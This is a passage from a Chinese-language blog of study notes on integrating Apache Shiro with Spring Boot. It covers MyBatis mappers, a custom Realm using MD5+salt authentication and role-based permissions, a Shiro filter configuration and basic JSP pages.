<p>Servicelmpl业务层实现一下<br><figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Perms&gt; findPermsByRoleId(String id) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">return</span> userDAO.<span class="title">findPermsByRoleId</span><span class="params">(id)</span></span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>对应的Mapper添加上select<br><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">&lt;select <span class="built_in">id</span>=<span class="string">"findPermsByRoleId"</span> parameterType=<span class="string">"String"</span> resultType=<span class="string">"Perms"</span>&gt;</span><br><span class="line">    select p.<span class="built_in">id</span>,p.<span class="built_in">name</span>,p.url,r.<span class="built_in">name</span></span><br><span class="line">    <span class="keyword">from</span> t_role r</span><br><span class="line">    left join t_role_perms rp</span><br><span class="line">    <span class="keyword">on</span> r.<span class="built_in">id</span> = rp.roleid</span><br><span class="line">    left join t_perms p</span><br><span class="line">    <span class="keyword">on</span> rp.permsid = p.<span class="built_in">id</span></span><br><span class="line">    <span class="keyword">where</span> r.<span class="built_in">id</span>=<span class="comment">#&#123;id&#125;;</span></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure></p>
<p>这些都做完了 就可以去自定义Realm中添加获取权限信息了</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">    @Override</span><br><span class="line">    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) &#123;</span><br><span class="line">        //获取身份信息</span><br><span class="line">        String primaryPrincipal = (String) principalCollection.getPrimaryPrincipal();</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("调用授权验证："+primaryPrincipal);</span><br><span class="line">        //根据主身份信息获取角色和权限信息</span><br><span class="line">//        <span class="keyword">if</span>("xiaochen".equals(primaryPrincipal))&#123;</span><br><span class="line">//            SimpleAuthorizationInfo simpleAuthorizationInfo = <span class="built_in">new</span> SimpleAuthorizationInfo();</span><br><span class="line">//</span><br><span class="line">//            simpleAuthorizationInfo.addRole("user");</span><br><span class="line">//</span><br><span class="line">//            simpleAuthorizationInfo.addStringPermission("user:find:*");</span><br><span class="line">//            simpleAuthorizationInfo.addStringPermission("user:update:*");</span><br><span class="line">//</span><br><span class="line">//            <span class="keyword">return</span> simpleAuthorizationInfo;</span><br><span class="line">//        &#125;</span><br><span class="line">        UserService userService = (UserService) ApplicationContextUtils.getBean("userService");</span><br><span class="line">        <span class="keyword">User</span> <span class="keyword">user</span> = userService.findRolesByUserName(primaryPrincipal);</span><br><span class="line">        //授权角色信息</span><br><span class="line">        <span class="keyword">if</span>(!CollectionUtils.isEmpty(<span class="keyword">user</span>.getRoles()))&#123;</span><br><span class="line">            SimpleAuthorizationInfo simpleAuthorizationInfo = <span class="built_in">new</span> SimpleAuthorizationInfo();</span><br><span class="line">            <span class="keyword">user</span>.getRoles().<span class="keyword">forEach</span>(<span class="keyword">role</span> -&gt;&#123;</span><br><span class="line">                simpleAuthorizationInfo.addRole(<span class="keyword">role</span>.getName());</span><br><span class="line"></span><br><span class="line">                //权限信息</span><br><span class="line">                List&lt;Perms&gt; perms = userService.findPermsByRoleId(<span class="keyword">role</span>.getId());</span><br><span class="line">                <span class="keyword">if</span>(!CollectionUtils.isEmpty(perms))&#123;</span><br><span class="line">                    perms.<span class="keyword">forEach</span>(perm-&gt;&#123;</span><br><span class="line">                        simpleAuthorizationInfo.addStringPermission(perm.getName());</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> simpleAuthorizationInfo;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这样，以数据库的认证授权操作就全部做完了</p>
<p>剩下的就是去优化了  因为现在这样写 每次登录的时候都会去查数据库  所以我们要将授权角色信息和权限信息进行一个缓存  来优化我们的认证和授权</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-2020/12/2-数据库+MD5+Salt认证</title>
    <url>/2020/12/02/Shiro-2020-12-2-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="SpringBoot-Shiro整合思路"><a href="#SpringBoot-Shiro整合思路" class="headerlink" title="SpringBoot+Shiro整合思路"></a>SpringBoot+Shiro整合思路</h1><h2 id="数据库-MD5-Salt认证功能"><a href="#数据库-MD5-Salt认证功能" class="headerlink" title="数据库+MD5+Salt认证功能"></a>数据库+MD5+Salt认证功能</h2><p>之前完成了用户md5+salt的用户注册流程</p>
<p>现在就完成以下认证的功能</p>
<p>认证的数据依旧是来自于数据库中的<br>这里就需要修改一下自定义realm中的认证实现换成数据库而不是写死的功能</p>
<p>需要现在UserDAO增加一个方法<br><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span> <span class="title">findByUserName</span>(<span class="keyword">String</span> username);</span><br></pre></td></tr></table></figure></p>
<p>在UserDAOMapper.xml中添加对应的select方法<br><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">select</span> id=<span class="string">"findByUserName"</span> parameterType=<span class="string">"String"</span> resultType=<span class="string">"User"</span>&gt;</span><br><span class="line">        <span class="keyword">select</span> id,username,password,salt <span class="keyword">from</span> t_user</span><br><span class="line">        <span class="keyword">where</span> username = <span class="meta">#&#123;username&#125;</span></span><br><span class="line">    &lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure><br>同样的在业务层UserService添加方法<br><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">//根据用户名查询业务的方法</span><br><span class="line">    <span class="keyword">User</span> <span class="title">findByUserName</span>(<span class="keyword">String</span> username);</span><br></pre></td></tr></table></figure><br>UserServiceImpl中的实现也要加上<br><figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function">User <span class="title">findByUserName</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">return</span> userDAO.<span class="title">findByUserName</span><span class="params">(username)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接着就是去修改realm方法啦,但是并没有业务对象，现在业务对象是由工厂去进行注入的</p>
<p>所以就建一个工具类ApplicationContextUtils<br><figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeansException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContextAware;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationContextUtils</span> <span class="keyword">implements</span> <span class="title">ApplicationContextAware</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ApplicationContext context;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">setApplicationContext</span><span class="params">(ApplicationContext applicationContext)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.context = applicationContext;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据bean名字获取工厂中指定bean对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function">Object <span class="title">getBean</span><span class="params">(String beanName)</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">return</span> context.<span class="title">getBean</span><span class="params">(beanName)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来就可以把自定义realm中写死的数据改为数据库连接了<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.realms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.entity.<span class="type">User</span>;</span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.service.<span class="type">UserService</span>;</span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.utils.<span class="type">ApplicationContextUtils</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationException</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationToken</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">SimpleAuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.<span class="type">AuthorizationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.<span class="type">AuthorizingRealm</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.<span class="type">PrincipalCollection</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.<span class="type">ByteSource</span>;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.<span class="type">ObjectUtils</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义Realm</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">CustomerRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthorizationInfo</span> doGetAuthorizationInfo(<span class="type">PrincipalCollection</span> principalCollection) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthenticationInfo</span> doGetAuthenticationInfo(<span class="type">AuthenticationToken</span> authenticationToken) <span class="keyword">throws</span> <span class="type">AuthenticationException</span> &#123;</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"====================================="</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//根据身份信息</span></span><br><span class="line">        <span class="type">String</span> principal = (<span class="type">String</span>)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="comment">//在工厂中获取service对象</span></span><br><span class="line">        <span class="type">UserService</span> userService = (<span class="type">UserService</span>) <span class="type">ApplicationContextUtils</span>.getBean(<span class="string">"userService"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> user = userService.findByUserName(principal);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="type">ObjectUtils</span>.isEmpty(user))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="type">SimpleAuthenticationInfo</span>(user.getUsername(),user.getPassword(), <span class="type">ByteSource</span>.<span class="type">Util</span>.bytes(user.getSalt()),<span class="keyword">this</span>.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>但是这样还不行 因为我们的数据进行了md5和加盐的操作 所以必须还要修改一下凭证校验匹配器<br>在ShiroConfig中<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.<span class="built_in">config</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.shiro.realms.CustomerRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.credential.HashedCredentialsMatcher;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.Realm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用来整合Shiro框架的配置类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@Configuration</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroConfig</span> &#123;</span></span><br><span class="line">    <span class="comment">//1. 创建shiroFilter</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span></span>&#123;</span><br><span class="line">        ShiroFilterFactoryBean shiroFilterFactoryBean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给filter设置安全管理器</span></span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置系统受限资源</span></span><br><span class="line">        <span class="comment">//配置系统公共资源</span></span><br><span class="line">        Map&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt; <span class="built_in">map</span> = <span class="keyword">new</span> HashMap&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt;();</span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/user/login"</span>,<span class="string">"anon"</span>); <span class="comment">//anon 设置为公共资源</span></span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/user/register"</span>,<span class="string">"anon"</span>);</span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/register.jsp"</span>,<span class="string">"anon"</span>);</span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/**"</span>,<span class="string">"authc"</span>);  <span class="comment">//authc 请求这个资源需要认证和授权</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//默认认证界面路径</span></span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(<span class="string">"/login.jsp"</span>);</span><br><span class="line">        shiroFilterFactoryBean.setFilterChainDefinitionMap(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 创建安全管理器</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultWebSecurityManager <span class="title">getDefaultWebSecurityManager</span><span class="params">(@Qualifier(<span class="string">"getRealm"</span>) Realm realm)</span></span>&#123;</span><br><span class="line">        DefaultWebSecurityManager defaultWebSecurityManager = <span class="keyword">new</span> DefaultWebSecurityManager();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给安全管理器设置realm</span></span><br><span class="line">        defaultWebSecurityManager.setRealm(realm);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> defaultWebSecurityManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. 创建自定义realm</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Realm <span class="title">getRealm</span><span class="params">()</span></span>&#123;</span><br><span class="line">        CustomerRealm customerRealm = <span class="keyword">new</span> CustomerRealm();</span><br><span class="line">        <span class="comment">//修改凭证校验匹配器</span></span><br><span class="line">        HashedCredentialsMatcher credentialsMatcher = <span class="keyword">new</span> HashedCredentialsMatcher();</span><br><span class="line">        <span class="comment">//设置加密方式为md5</span></span><br><span class="line">        credentialsMatcher.setHashAlgorithmName(<span class="string">"MD5"</span>);</span><br><span class="line">        <span class="comment">//设置散列次数</span></span><br><span class="line">        credentialsMatcher.setHashIterations(<span class="number">1024</span>);</span><br><span class="line">        customerRealm.setCredentialsMatcher(credentialsMatcher);</span><br><span class="line">        <span class="keyword">return</span> customerRealm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这样就完成了数据库+MD5+Salt的认证功能了</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-2020/11/30-SpringBoot+Shiro整合</title>
    <url>/2020/11/30/Shiro-2020-11-30-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="SpringBoot-Shiro"><a href="#SpringBoot-Shiro" class="headerlink" title="SpringBoot+Shiro"></a>SpringBoot+Shiro</h1><h2 id="整合思路"><a href="#整合思路" class="headerlink" title="整合思路"></a>整合思路</h2><p><img src="/img/JavaWeb/11-30学习日记/0.png" alt="avatar"></p>
<h2 id="引入Shiro依赖"><a href="#引入Shiro依赖" class="headerlink" title="引入Shiro依赖"></a>引入Shiro依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建SpringBoot项目就不多说了</p>
<p>还需要引入一下jstl的依赖<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">         <span class="comment">&lt;!--        引入jsp解析依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        jstl--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        servlet-api--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>application.properties文件配置为<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="number">8080</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=/shiro</span><br><span class="line"><span class="attr">spring.application.name</span>=shiro</span><br><span class="line"></span><br><span class="line"><span class="attr">spring.mvc.view.prefix</span>=/</span><br><span class="line"><span class="attr">spring.mvc.view.suffix</span>=.jsp</span><br></pre></td></tr></table></figure></p>
<p>这样环境就配置好了</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在webapp下创建index.jps和login.jsp<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@page contentType=<span class="string">"text/html;  UTF-8"</span> pageEncoding=<span class="string">"UTF-8"</span> isELIgnored=<span class="string">"false"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>系统主页V1.0<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>用户管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>商品管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>订单管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>物流管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>login.jsp<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@page contentType=<span class="string">"text/html;  UTF-8"</span> pageEncoding=<span class="string">"UTF-8"</span> isELIgnored=<span class="string">"false"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>登陆页面<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>接着创建一个config包来存放Shiroconfig<br><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.<span class="built_in">config</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.shiro.realms.CustomerRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.Realm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用来整合Shiro框架的配置类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@Configuration</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroConfig</span> &#123;</span></span><br><span class="line">    <span class="comment">//1. 创建shiroFilter</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span></span>&#123;</span><br><span class="line">        ShiroFilterFactoryBean shiroFilterFactoryBean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给filter设置安全管理器</span></span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置系统受限资源</span></span><br><span class="line">        <span class="comment">//配置系统公共资源</span></span><br><span class="line">        Map&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt; <span class="built_in">map</span> = <span class="keyword">new</span> HashMap&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt;();</span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/index.jsp"</span>,<span class="string">"authc"</span>); 